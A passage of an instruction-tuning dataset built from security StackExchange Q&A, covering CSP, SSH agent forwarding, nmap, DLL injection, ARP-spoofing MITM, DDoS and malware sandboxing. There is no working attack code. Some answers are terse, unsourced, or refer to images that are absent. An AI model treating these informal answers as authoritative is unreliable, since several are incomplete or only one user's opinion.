      "answer": "If no CSP is specified for a directive, it falls back to default-src.\nIf there is no default-src CSP, it does not fall back on any directive and thus it allows everything.\nI have searched the RFC about it and I could hardly find anything to quote that would push my statement. However, this is implied multiple times.\n\nTo enforce a policy, the user agent MUST parse the policy and enforce\neach of the directives contained in the policy\n\ndefault-src is a directive by itself. Thus, it WILL enforce default-src which actions is to set the default value for all others directive. If default-src the browser does not have to enforce any default restriction for other directives."
    }
  },
  {
    "instruction": "Question: Are there any risks associated with SSH agent forwarding?\nI just realized that I need SSH agent forwarding in order to push to one Git server that then forwards the commits to Github.com. I never used SSH agent forwarding and don't understand the security implications of enabling this feature. Do I have to trust the remote server in order to allow SSH agent forwarding to it?",
    "context": "",
    "output": "Answer: Yes, you have to trust the remote server if you allow agent forwarding for this server (especially if you use the same key for more services). Doing so rogue root or evil admin with root access can impersonate you for authentication to other servers during the time you are connected to that server.\nThe state is still better than accessing the key permanently or stealing it from you, what could happen when you would copy your private key to the server, but this is still an issue, since there is no confirmation on your side, that you really want to do crypto with your key in agent.\nUsing separate key for github is probably good idea. And having middle-step-clone of your important repository on a server you don't trust is probably something you also don't want.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Are there any risks associated with SSH agent forwarding?\nI just realized that I need SSH agent forwarding in order to push to one Git server that then forwards the commits to Github.com. I never used SSH agent forwarding and don't understand the security implications of enabling this feature. Do I have to trust the remote server in order to allow SSH agent forwarding to it?",
      "answer": "Yes, you have to trust the remote server if you allow agent forwarding for this server (especially if you use the same key for more services). Doing so rogue root or evil admin with root access can impersonate you for authentication to other servers during the time you are connected to that server.\nThe state is still better than accessing the key permanently or stealing it from you, what could happen when you would copy your private key to the server, but this is still an issue, since there is no confirmation on your side, that you really want to do crypto with your key in agent.\nUsing separate key for github is probably good idea. And having middle-step-clone of your important repository on a server you don't trust is probably something you also don't want."
    }
  },
  {
    "instruction": "Answer this question:\n\nBest and most current sites for security breaches\nI'm taking my masters in cyber-security and as a student I come across a lot of garbage when doing research.  What are sites with the latest security breaches?   Thanks for the help in advanced.\nMy current one so far is www.darkreading.com but I'm sure there is much better out there.",
    "context": "",
    "output": "A: I find that the social groups are the best bet for breaking sec news - such as Twitter, Facebook and Reddit.\nCheck out the 2600 group on facebook, /r/netsec on reddit and start poking around the security news sources on twitter. Honestly there are a ton of different outlets for infosec available these days.\nFor the more 'established' news sources I use techworm.net and thehackerspot.com. Forbes has some good articles from time to time as well.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Best and most current sites for security breaches\nI'm taking my masters in cyber-security and as a student I come across a lot of garbage when doing research.  What are sites with the latest security breaches?   Thanks for the help in advanced.\nMy current one so far is www.darkreading.com but I'm sure there is much better out there.",
      "answer": "I find that the social groups are the best bet for breaking sec news - such as Twitter, Facebook and Reddit.\nCheck out the 2600 group on facebook, /r/netsec on reddit and start poking around the security news sources on twitter. Honestly there are a ton of different outlets for infosec available these days.\nFor the more 'established' news sources I use techworm.net and thehackerspot.com. Forbes has some good articles from time to time as well."
    }
  },
  {
    "instruction": "Question: Is it bad practice to share password hashes between systems?\nFor a system currently being constructed, the user will need to log in to multiple systems with the same password. One system (A) is always leading, and the user can only change the password on system A. The new hash is then copied to system B and on. Each system B only has a subset of the credentials of system A.\nFor technical (deployment and connectivity) reasons we cannot use a single sign-on technology like OAuth to transfer trust. The systems B are rarely connected, so while we can push information from A to B, we cannot allow B to rely on a connection to A for its user validation.\nOf course we correctly salt and hash the passwords.\nNow I wonder: is it bad practice for these systems, all of them under our control, to share the same password hash for a user?",
    "context": "",
    "output": "Answer: The issue with this design is that there are now multiple points of failure.  A compromise of the database for application A now compromises the security of application B.  You also have more transport security to worry about.  An attacker can theoretically get a MITM for the password copy from application A to application B.  A traditionally designed application does not suffer from this flaw.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is it bad practice to share password hashes between systems?\nFor a system currently being constructed, the user will need to log in to multiple systems with the same password. One system (A) is always leading, and the user can only change the password on system A. The new hash is then copied to system B and on. Each system B only has a subset of the credentials of system A.\nFor technical (deployment and connectivity) reasons we cannot use a single sign-on technology like OAuth to transfer trust. The systems B are rarely connected, so while we can push information from A to B, we cannot allow B to rely on a connection to A for its user validation.\nOf course we correctly salt and hash the passwords.\nNow I wonder: is it bad practice for these systems, all of them under our control, to share the same password hash for a user?",
      "answer": "The issue with this design is that there are now multiple points of failure.  A compromise of the database for application A now compromises the security of application B.  You also have more transport security to worry about.  An attacker can theoretically get a MITM for the password copy from application A to application B.  A traditionally designed application does not suffer from this flaw."
    }
  },
  {
    "instruction": "Answer the question below.\nnmap scan shows ports are filtered but nessus scan shows no result\nI'm performing an port scanning on a range of IPs on our remote site. I tried running nmap scan on that IP range and some of the IP result are shown as filtered\nWhen I perform a nessus scan on the box, there is no result at all for some of the IPs.\nAs such is it safe to assume that there is no open ports on some of the remote server?",
    "context": "",
    "output": "The nmap result \"filtered\" implies that (if you know there is a host with that IP address) access to the port has been blocked by a firewall or similar, which is dropping the traffic.  This is as opposed to the \"closed\" result which indicates that there is a host on that IP but that there is no active service which responds to nmaps probes.\nIf all ports on a host come back as filtered, there's either nothing there, or there's a firewall configured to drop all traffic directed to it.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "nmap scan shows ports are filtered but nessus scan shows no result\nI'm performing an port scanning on a range of IPs on our remote site. I tried running nmap scan on that IP range and some of the IP result are shown as filtered\nWhen I perform a nessus scan on the box, there is no result at all for some of the IPs.\nAs such is it safe to assume that there is no open ports on some of the remote server?",
      "answer": "The nmap result \"filtered\" implies that (if you know there is a host with that IP address) access to the port has been blocked by a firewall or similar, which is dropping the traffic.  This is as opposed to the \"closed\" result which indicates that there is a host on that IP but that there is no active service which responds to nmaps probes.\nIf all ports on a host come back as filtered, there's either nothing there, or there's a firewall configured to drop all traffic directed to it."
    }
  },
  {
    "instruction": "Q: Defining Pointers outside the Target Proccess Memory Space\nI am making a memory editor for an application written in Python. I've successfully grabbed the memory data from the target process using OpenProcess and ReadProcessMemory functions from the kernel32.dll. \nOnce i have the data i manipulate it accordingly using python, and i pass it into a gui that i've created. \nWhat i want to do is this: Because the data that i grab contain static memory addresses, and there is no other way to write back to memory without calling WriteProcessMemory again, i thought of creating pointers that point directly to the static memory addresses so that with some tweaks in the gui, the values will get immediately back in memory.\nI tried to do this using ctypes cast function, which successfully creates the pointer (at least it does not spawn any error) but when i am trying to get the pointer contents, python crashes, so the only logical explanation is that the python script does not have direct access to the process memory space in order to load the data.\nBecause of my lack of experience on the matter, i have no idea what i can do to make this possible. Is this where dll injection comes in handy? My only other option is to store the memory data as a file object in python, don't make use of the static pointers (that means a lot of conversions), make my changes and put the data back using WriteProcessMemory.\nAny help is highly appreciated",
    "context": "",
    "output": " A: Memory in almost all modern OSes is virtualized, which means each process has its own address space. This means that the same addresses holds a different value in your python program than it holds in your debugee.\nSo, the only way to patch that memory is WriteProcessMemory, there's no way to access the memory of your debugee with any kind of pointer.\nIf you inject a DLL into the debugged process, that DLL could access the memory of that process directly, however, this still leaves you with the problem of how to communicate with the DLL, since you can't just call any functions in it if it's not in your process space. Combined with all other problems this may cause, i'd strongly recommend against that.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Defining Pointers outside the Target Proccess Memory Space\nI am making a memory editor for an application written in Python. I've successfully grabbed the memory data from the target process using OpenProcess and ReadProcessMemory functions from the kernel32.dll. \nOnce i have the data i manipulate it accordingly using python, and i pass it into a gui that i've created. \nWhat i want to do is this: Because the data that i grab contain static memory addresses, and there is no other way to write back to memory without calling WriteProcessMemory again, i thought of creating pointers that point directly to the static memory addresses so that with some tweaks in the gui, the values will get immediately back in memory.\nI tried to do this using ctypes cast function, which successfully creates the pointer (at least it does not spawn any error) but when i am trying to get the pointer contents, python crashes, so the only logical explanation is that the python script does not have direct access to the process memory space in order to load the data.\nBecause of my lack of experience on the matter, i have no idea what i can do to make this possible. Is this where dll injection comes in handy? My only other option is to store the memory data as a file object in python, don't make use of the static pointers (that means a lot of conversions), make my changes and put the data back using WriteProcessMemory.\nAny help is highly appreciated",
      "answer": "Memory in almost all modern OSes is virtualized, which means each process has its own address space. This means that the same addresses holds a different value in your python program than it holds in your debugee.\nSo, the only way to patch that memory is WriteProcessMemory, there's no way to access the memory of your debugee with any kind of pointer.\nIf you inject a DLL into the debugged process, that DLL could access the memory of that process directly, however, this still leaves you with the problem of how to communicate with the DLL, since you can't just call any functions in it if it's not in your process space. Combined with all other problems this may cause, i'd strongly recommend against that."
    }
  },
  {
    "instruction": "What is the answer to this question - What are the advantages of port scanning?\nIt seems like all the google results to this question answer what port scanning is, but go into little detail about how a pentester or hacker could use the information about what ports a network has open to leverage an attack on it.\nWhy do vulnerabilities arise by scanning and finding open ports, and what are those vulnerabilities?\n\n",
    "context": "",
    "output": "I can open a locked 2000 VW Golf with a flathead screwdriver. I want to steal a car, so I walk through a car park with my screwdriver looking for Golfs. I do so by looking in each parking space.\nI'm not looking for the parking spaces, I'm looking in each parking space to see if it has a 2000 VW Golf. Once I find one, I can exploit the door lock's vulnerability and unlock the car. I could wander around the parking lot in the dark and blindfolded, jamming my screwdriver into anything that feels like metal, but that's just silly.\nPort scanning identifies network services running on a host so that the attacker can exploit vulnerabilities in the service. (source) Trying to run random exploits on random ports is just silly.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What are the advantages of port scanning?\nIt seems like all the google results to this question answer what port scanning is, but go into little detail about how a pentester or hacker could use the information about what ports a network has open to leverage an attack on it.\nWhy do vulnerabilities arise by scanning and finding open ports, and what are those vulnerabilities?",
      "answer": "I can open a locked 2000 VW Golf with a flathead screwdriver. I want to steal a car, so I walk through a car park with my screwdriver looking for Golfs. I do so by looking in each parking space.\nI'm not looking for the parking spaces, I'm looking in each parking space to see if it has a 2000 VW Golf. Once I find one, I can exploit the door lock's vulnerability and unlock the car. I could wander around the parking lot in the dark and blindfolded, jamming my screwdriver into anything that feels like metal, but that's just silly.\nPort scanning identifies network services running on a host so that the attacker can exploit vulnerabilities in the service. (source) Trying to run random exploits on random ports is just silly."
    }
  },
  {
    "instruction": "Answer the question below.\nWindows \"Send to compressed file\" creates an image?\nOne of my friends windows laptops (which I don't have access to right now) has in the recent past had a virus (where .doc files were converted to .exe files) which we dealt with. \nNow when she right-clicks a folder to \"send to compressed file\" instead of creating a .zip file it creates an image file (jpg/png variety - will find out which).  Is this known behaviour of a virus?  I can't find anything anywhere about this kind of behaviour.  Avast is not picking it up as a virus, but I can't imagine it being anything but a virus.\nWhere do I start to fix this?",
    "context": "",
    "output": "type this command in run window \nwindows xp\nrundll32 zipfldr.dll,RegisterSendto\n\nwindows 7\nregsvr32 %windir%/system32/zipfldr.dll\n\nand click ok....",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Windows \"Send to compressed file\" creates an image?\nOne of my friends windows laptops (which I don't have access to right now) has in the recent past had a virus (where .doc files were converted to .exe files) which we dealt with. \nNow when she right-clicks a folder to \"send to compressed file\" instead of creating a .zip file it creates an image file (jpg/png variety - will find out which).  Is this known behaviour of a virus?  I can't find anything anywhere about this kind of behaviour.  Avast is not picking it up as a virus, but I can't imagine it being anything but a virus.\nWhere do I start to fix this?",
      "answer": "type this command in run window \nwindows xp\nrundll32 zipfldr.dll,RegisterSendto\n\nwindows 7\nregsvr32 %windir%/system32/zipfldr.dll\n\nand click ok...."
    }
  },
  {
    "instruction": "Answer the following question:\n\nMITM vs promiscuous mode?\nWhat is the advantage(s) (besides the possibility to alter network traffic) of using MITM techniques over just sniffing in promiscuous mode?",
    "context": "",
    "output": "On a switched network, promiscuous mode does not show you any additional traffic because the network switch will only forward packets destined for your MAC address to your port on the switch.  In the case of a MITM, you can use ARP spoofing or other MITM techniques to get clients to connect through you, such that you can see their traffic.\nAs you point out, a MITM can also conduct active attacks (tamper/modify/drop traffic) to further benefit their objectives.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "MITM vs promiscuous mode?\nWhat is the advantage(s) (besides the possibility to alter network traffic) of using MITM techniques over just sniffing in promiscuous mode?",
      "answer": "On a switched network, promiscuous mode does not show you any additional traffic because the network switch will only forward packets destined for your MAC address to your port on the switch.  In the case of a MITM, you can use ARP spoofing or other MITM techniques to get clients to connect through you, such that you can see their traffic.\nAs you point out, a MITM can also conduct active attacks (tamper/modify/drop traffic) to further benefit their objectives."
    }
  },
  {
    "instruction": "Can you tell me the answer to: DLL - Dynamic Analysis on IDA\nI'm \"middle-new\" in re and I have to debug a dll's function. How can I tell to IDA : start function XXX with parameters A, B and C ?\nIs there a solution or a plugin doing that ? I've tried doing that with rundll32.exe but unsucessfully.\nI have no experience on ollydbg this is why I ask for a IDA solution\nThanks for helping !",
    "context": "",
    "output": "answer: Based on this answer, rundll only supports running functions with a specific signature. I would recommend writing a simple executable that loads it. For example, in c, you could call LoadLibrary(\"yourdll.dll\") and then GetProcAddress(\"yourfunc\") and then call it that way. See MSDN (linked) for more info.\nIn IDA, you would then give your executable as the process, but your dll as the input file. That will allow you to set breakpoints that IDA will set when the dll is loaded. It also gives you control over the parameters since you can just pass them through from the command line.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "DLL - Dynamic Analysis on IDA\nI'm \"middle-new\" in re and I have to debug a dll's function. How can I tell to IDA : start function XXX with parameters A, B and C ?\nIs there a solution or a plugin doing that ? I've tried doing that with rundll32.exe but unsucessfully.\nI have no experience on ollydbg this is why I ask for a IDA solution\nThanks for helping !",
      "answer": "Based on this answer, rundll only supports running functions with a specific signature. I would recommend writing a simple executable that loads it. For example, in c, you could call LoadLibrary(\"yourdll.dll\") and then GetProcAddress(\"yourfunc\") and then call it that way. See MSDN (linked) for more info.\nIn IDA, you would then give your executable as the process, but your dll as the input file. That will allow you to set breakpoints that IDA will set when the dll is loaded. It also gives you control over the parameters since you can just pass them through from the command line."
    }
  },
  {
    "instruction": "Please answer this question: Define partial struct with IDA\nI want to define struct in Ida , but I know only partial of this struct\nI only know that in arr[12] that int student_id , and I don't know the rest of struct. Ida recognize that struct as char * .\nHow can I define that struct?",
    "context": "",
    "output": "Something like:\nstruct partially_known {\n  char gap0[12];\n  int student_id;\n  char gap10[32];\n};",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Define partial struct with IDA\nI want to define struct in Ida , but I know only partial of this struct\nI only know that in arr[12] that int student_id , and I don't know the rest of struct. Ida recognize that struct as char * .\nHow can I define that struct?",
      "answer": "Something like:\nstruct partially_known {\n  char gap0[12];\n  int student_id;\n  char gap10[32];\n};"
    }
  },
  {
    "instruction": "Answer the question below.\nIs there any risk involved allowing users to create their own URL's\nI am about to launch a eCommerce platform where users have their own shop URL based on the username IE my username on stack is NoobSkie so I would access my shop at \nwww.example.com/noobskie/shop\nIs there any thing that could go wrong with this setup with people trying to manipulate URL's?",
    "context": "",
    "output": "It depends on the validation that is in place regarding the username. \nIf you already \n\nwhitelist the characters in the username to alphanumeric only\nrestrict the maximum size of the usernames\nensure username unicity\nensure that no username can match existing url's (depends on your site, maybe this is not needed.. It is if you have for example something like /default/shop or /welcome/shop)\n\n, I don't see much of a risk :)",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is there any risk involved allowing users to create their own URL's\nI am about to launch a eCommerce platform where users have their own shop URL based on the username IE my username on stack is NoobSkie so I would access my shop at \nwww.example.com/noobskie/shop\nIs there any thing that could go wrong with this setup with people trying to manipulate URL's?",
      "answer": "It depends on the validation that is in place regarding the username. \nIf you already \n\nwhitelist the characters in the username to alphanumeric only\nrestrict the maximum size of the usernames\nensure username unicity\nensure that no username can match existing url's (depends on your site, maybe this is not needed.. It is if you have for example something like /default/shop or /welcome/shop)\n\n, I don't see much of a risk :)"
    }
  },
  {
    "instruction": "Question: Does send HTTP requests as signed tokens make sense when mutual TLS is used?\nWhen we use mTLS, then client and server are authenticated. In this scenario, does it make any sense to send HTTP requests in signed tokens (like JWS)?",
    "context": "",
    "output": "Answer: TLS only protects the specific communication between client and server and the authentication is also only restricted to this communication. If messages are forwarded to some backend or stored in a database, then the final receiver of the message can only trust the server that it properly checked the client with mTLS, but it cannot do this check itself.\nOnly if each message itself is separately signed by the sender and the signature is forwarded together with the message, then the final recipient can verify the origin of the message. TLS/mTLS do not provide this - it only provides authentication at the beginning and then integrity protection for all messages - but not signing of the messages.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Does send HTTP requests as signed tokens make sense when mutual TLS is used?\nWhen we use mTLS, then client and server are authenticated. In this scenario, does it make any sense to send HTTP requests in signed tokens (like JWS)?",
      "answer": "TLS only protects the specific communication between client and server and the authentication is also only restricted to this communication. If messages are forwarded to some backend or stored in a database, then the final receiver of the message can only trust the server that it properly checked the client with mTLS, but it cannot do this check itself.\nOnly if each message itself is separately signed by the sender and the signature is forwarded together with the message, then the final recipient can verify the origin of the message. TLS/mTLS do not provide this - it only provides authentication at the beginning and then integrity protection for all messages - but not signing of the messages."
    }
  },
  {
    "instruction": "Q: Is it safe to store password in HTML5 sessionStorage?\nI am trying to improve the user experience on registration by not requiring the user to retype their password if validation on other fields fail. There are a few ways to implement this, example using session cookie and storing a hash of the password on the server side. I am exploring this alternative of storing user password temporarily on the client side without having the server to keep track of it. Is this method feasible? What are the risks involved?",
    "context": "",
    "output": " A: I suggest another approach: Instead of submitting the form to the server, use an XMLHttpRequest to create the account. If server side validation fails, the form and all its content is still available. If it was successful, redirect to the target page.\nThis requires that JavaScript is enabled, but you still can fall back to normal form submission. Access to SessionStorage requires JavaScript as well anyway.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is it safe to store password in HTML5 sessionStorage?\nI am trying to improve the user experience on registration by not requiring the user to retype their password if validation on other fields fail. There are a few ways to implement this, example using session cookie and storing a hash of the password on the server side. I am exploring this alternative of storing user password temporarily on the client side without having the server to keep track of it. Is this method feasible? What are the risks involved?",
      "answer": "I suggest another approach: Instead of submitting the form to the server, use an XMLHttpRequest to create the account. If server side validation fails, the form and all its content is still available. If it was successful, redirect to the target page.\nThis requires that JavaScript is enabled, but you still can fall back to normal form submission. Access to SessionStorage requires JavaScript as well anyway."
    }
  },
  {
    "instruction": "What is the answer to this question - Generating partical Eliptic Curve Diffie-Hellman keys\nI want to generate a pair of ECDH keys (64 bytes each), where the first 12 bytes of the public key will suit my format. \nFor example, if I have a unique sequence \"13456789ABC\" I'd like to use it as the first 12 bytes of the 64 bytes long public key (the rest of the length is padded by the generated values). For each generation of the keys, the sequence will change a little bit so it is unique.\nSo I'm basically asking two things:\n\nIs this possible?\nIs there a generator which would allow me to specify a prefix of a suitable length for the public key?\n\n",
    "context": "",
    "output": "Quick answers:\n\nNot impossible, but pretty much in the realm of defeating PKI - so not easy by a long shot (yet). \n[edit: If it ever becomes easy, you might want to stop using that implementation of PKI for security in the first place!]\nI have not come across such a generator.\n\nPKI makes that difficult by design (not necessarily in implementation though that's a digression) - so you might want to look for design solutions that better suit your needs. Or state your underlying need, to explore possibilities.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Generating partical Eliptic Curve Diffie-Hellman keys\nI want to generate a pair of ECDH keys (64 bytes each), where the first 12 bytes of the public key will suit my format. \nFor example, if I have a unique sequence \"13456789ABC\" I'd like to use it as the first 12 bytes of the 64 bytes long public key (the rest of the length is padded by the generated values). For each generation of the keys, the sequence will change a little bit so it is unique.\nSo I'm basically asking two things:\n\nIs this possible?\nIs there a generator which would allow me to specify a prefix of a suitable length for the public key?",
      "answer": "Quick answers:\n\nNot impossible, but pretty much in the realm of defeating PKI - so not easy by a long shot (yet). \n[edit: If it ever becomes easy, you might want to stop using that implementation of PKI for security in the first place!]\nI have not come across such a generator.\n\nPKI makes that difficult by design (not necessarily in implementation though that's a digression) - so you might want to look for design solutions that better suit your needs. Or state your underlying need, to explore possibilities."
    }
  },
  {
    "instruction": "Can you tell me the answer to: DDoS - Impossible to stop?\nIs it possible - in theory - to stop1 a DDoS attack of any size? Many people claim it's impossible to stop DDoS attacks and tell me I just shouldn't mess with the wrong people on the internet.\nBut what if, in like 5 years, everyone is able to rent a botnet? Shouldn't we just re-think the whole internet architecture then?\n1: by stop I also accept remove the negative effects aka keep the service running.",
    "context": "",
    "output": "answer: No, it is not possible, in theory or practice. A well enough distributed DDoS attack is indistinguishable from legitimate traffic.\nConsider the \"slashdot\" or \"reddit\" or \"digg\" effects, where actual legitimate traffic takes down network services on the target website. Simply posting a link to the target website on slashdot is an effective DDoS in many cases.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "DDoS - Impossible to stop?\nIs it possible - in theory - to stop1 a DDoS attack of any size? Many people claim it's impossible to stop DDoS attacks and tell me I just shouldn't mess with the wrong people on the internet.\nBut what if, in like 5 years, everyone is able to rent a botnet? Shouldn't we just re-think the whole internet architecture then?\n1: by stop I also accept remove the negative effects aka keep the service running.",
      "answer": "No, it is not possible, in theory or practice. A well enough distributed DDoS attack is indistinguishable from legitimate traffic.\nConsider the \"slashdot\" or \"reddit\" or \"digg\" effects, where actual legitimate traffic takes down network services on the target website. Simply posting a link to the target website on slashdot is an effective DDoS in many cases."
    }
  },
  {
    "instruction": "How to trace the actions performed by a virus?\nIs that possible to trace the actions performed by a virus? Run Time , stolen data and the files consulted and get the relative impact on my pc.?",
    "context": "",
    "output": "I strongly recommend to run that virus in an artificial environment like a sandbox so you won't affect your personal computer! In this way you can track its activity through the sandbox specific CLI/GUI.\nSandbox Example: Cuckoo Sandbox, Sandboxie, etc.\nThe other way around: \nUse an virtual environment to test the malware and to manually track its activity.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to trace the actions performed by a virus?\nIs that possible to trace the actions performed by a virus? Run Time , stolen data and the files consulted and get the relative impact on my pc.?",
      "answer": "I strongly recommend to run that virus in an artificial environment like a sandbox so you won't affect your personal computer! In this way you can track its activity through the sandbox specific CLI/GUI.\nSandbox Example: Cuckoo Sandbox, Sandboxie, etc.\nThe other way around: \nUse an virtual environment to test the malware and to manually track its activity."
    }
  },
  {
    "instruction": "Q: Why Google and smartphone manufacturers don't care about updates?\nFor Windows, Firefox/Chrome, Java, Flash critical updates are issued each couple weeks, and as far my understanding goes, it is REALLY bad not to install them ASAP.\nFor my 3 year old Samsung smartphone, however, there isn't a single OS update. A brief research shows that in most cases you can't upgrade your Android version for most phones in a year or so after release.\nGiven that smartphone in many cases is a very juicy target for hackers, with all two-factor authenthications, email and bank passwords going through smartphone, it sounds very scary that there are basically no updates for OS/firmware.\nIs it really scary? If yes, why don't google enforce stricter policy for manufacturers, or don't make OS update by itself? What is situation with iPhones?",
    "context": "",
    "output": " A: Whilst I don't believe that there's a definitive confirmation that this is the situation, I'd suggest that the problem with android likely comes down to a conflict of interests between the carrier, handset manufacturer and OS manufacturer.\nIt's in Googles interests that handsets are upgraded regularly, as it improves peoples perception of the OS and makes app. developers lifes easier (less fragmentation makes easier testing).\nHowever from the handset and carrier perspective, updates are costly.  it costs a lot of money to test these updates and push them out so there's a disincentive there for them to do it. Also to an extent they'd rather you buy a new handset instead of getting the features from a free upgrade. That's why in general I think that android updates don't happen for older handsets, or are slow to happen.\nApple have always had a tight control on the whole process so have pushed for the updates to go out reguarly...",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Why Google and smartphone manufacturers don't care about updates?\nFor Windows, Firefox/Chrome, Java, Flash critical updates are issued each couple weeks, and as far my understanding goes, it is REALLY bad not to install them ASAP.\nFor my 3 year old Samsung smartphone, however, there isn't a single OS update. A brief research shows that in most cases you can't upgrade your Android version for most phones in a year or so after release.\nGiven that smartphone in many cases is a very juicy target for hackers, with all two-factor authenthications, email and bank passwords going through smartphone, it sounds very scary that there are basically no updates for OS/firmware.\nIs it really scary? If yes, why don't google enforce stricter policy for manufacturers, or don't make OS update by itself? What is situation with iPhones?",
      "answer": "Whilst I don't believe that there's a definitive confirmation that this is the situation, I'd suggest that the problem with android likely comes down to a conflict of interests between the carrier, handset manufacturer and OS manufacturer.\nIt's in Googles interests that handsets are upgraded regularly, as it improves peoples perception of the OS and makes app. developers lifes easier (less fragmentation makes easier testing).\nHowever from the handset and carrier perspective, updates are costly.  it costs a lot of money to test these updates and push them out so there's a disincentive there for them to do it. Also to an extent they'd rather you buy a new handset instead of getting the features from a free upgrade. That's why in general I think that android updates don't happen for older handsets, or are slow to happen.\nApple have always had a tight control on the whole process so have pushed for the updates to go out reguarly..."
    }
  },
  {
    "instruction": "Can you tell me the answer to: When is garbage collection activated on my Samsung T3 external usb SSD drive?\nThe trim command is unsupported on my Samsung T3 external usb ssd drive. I would like to know when and under what conditions the internal garbage collection is activated so it purges deleted files on the drive.",
    "context": "",
    "output": "answer: In the absence of TRIM, an external USB drive (SSD or not) is pure block storage. It just stores 512 or 4096 byte blocks. It doesn't know about files, let alone whether they're deleted.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "When is garbage collection activated on my Samsung T3 external usb SSD drive?\nThe trim command is unsupported on my Samsung T3 external usb ssd drive. I would like to know when and under what conditions the internal garbage collection is activated so it purges deleted files on the drive.",
      "answer": "In the absence of TRIM, an external USB drive (SSD or not) is pure block storage. It just stores 512 or 4096 byte blocks. It doesn't know about files, let alone whether they're deleted."
    }
  },
  {
    "instruction": "Please answer this question: How to explain Heartbleed without technical terms?\nMost of my friends who are not experienced in computers want to know what Heartbleed is and how it works. How would one explain Heartbleed to someone without a technical background?",
    "context": "",
    "output": "How about this one from XKCD?\n\nThe most \"non-technical\" explanation I found.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to explain Heartbleed without technical terms?\nMost of my friends who are not experienced in computers want to know what Heartbleed is and how it works. How would one explain Heartbleed to someone without a technical background?",
      "answer": "How about this one from XKCD?\n\nThe most \"non-technical\" explanation I found."
    }
  },
  {
    "instruction": "Answer the question below.\nHow do I get the location of the original audio/video file embedded on a webpage?\nSome sites like The Free Dictionary, and many other translation and pronunciation services, offers a little icon next to the word so you could hear its pronunciation.\nHow can I figure out the source for an audio\\video embedded file on a webpage? \nWhere do I start?",
    "context": "",
    "output": "Another way to find url with audio file is check get requests by Developer Tools in Chrome browser:",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How do I get the location of the original audio/video file embedded on a webpage?\nSome sites like The Free Dictionary, and many other translation and pronunciation services, offers a little icon next to the word so you could hear its pronunciation.\nHow can I figure out the source for an audio\\video embedded file on a webpage? \nWhere do I start?",
      "answer": "Another way to find url with audio file is check get requests by Developer Tools in Chrome browser:"
    }
  },
  {
    "instruction": "Do I need a new CSR for a certificate renewal?\nI want to renew my expired certificate I'm using in Tomcat for SSL.  Other posts indicate that to renew my certificate I need to create a new CSR and obtain a new certificate and import into my keystore.  However, if my private key is the same, why can I not just use the original CSR to request a new certificate?",
    "context": "",
    "output": "The short answer is that while yes you can reuse the CSR, it doesn't mean you should. \nIt's worth considering that encryption methods can improve over time (e.g., generating RSA keys @ 2048 or 4096 vs 1024 awhile back, sha256 vs. sha512, etc) so it's probably best to just generate a new one considering how trivial it is and increasing the private key strength if it's outdated.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Do I need a new CSR for a certificate renewal?\nI want to renew my expired certificate I'm using in Tomcat for SSL.  Other posts indicate that to renew my certificate I need to create a new CSR and obtain a new certificate and import into my keystore.  However, if my private key is the same, why can I not just use the original CSR to request a new certificate?",
      "answer": "The short answer is that while yes you can reuse the CSR, it doesn't mean you should. \nIt's worth considering that encryption methods can improve over time (e.g., generating RSA keys @ 2048 or 4096 vs 1024 awhile back, sha256 vs. sha512, etc) so it's probably best to just generate a new one considering how trivial it is and increasing the private key strength if it's outdated."
    }
  },
  {
    "instruction": "Please answer this question: How should I securely type a password in front of a lot of people?\nI am a manager in an office where the company does not provide a company email, so I use my personal email.\nOften, I will receive jobs lists by email from my general manager.\nHow should I log in to my email in front of my co-workers so that they don't see my password?\nMy email service uses end to end encryption, which means that it does not store or reset my password.\nI also cannot move the screen so my co-workers cannot see it.",
    "context": "",
    "output": "While I recommend two-factor authentication on your personal account, you could set up second, work only account (as others have suggested), set up an automatic forwarding rule to it for the emails that are work related, and then log into that when necessary.\nThis way, you don't need to have your professional contacts update your email address, and you're only logging into an account with non-personal emails.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How should I securely type a password in front of a lot of people?\nI am a manager in an office where the company does not provide a company email, so I use my personal email.\nOften, I will receive jobs lists by email from my general manager.\nHow should I log in to my email in front of my co-workers so that they don't see my password?\nMy email service uses end to end encryption, which means that it does not store or reset my password.\nI also cannot move the screen so my co-workers cannot see it.",
      "answer": "While I recommend two-factor authentication on your personal account, you could set up second, work only account (as others have suggested), set up an automatic forwarding rule to it for the emails that are work related, and then log into that when necessary.\nThis way, you don't need to have your professional contacts update your email address, and you're only logging into an account with non-personal emails."
    }
  },
  {
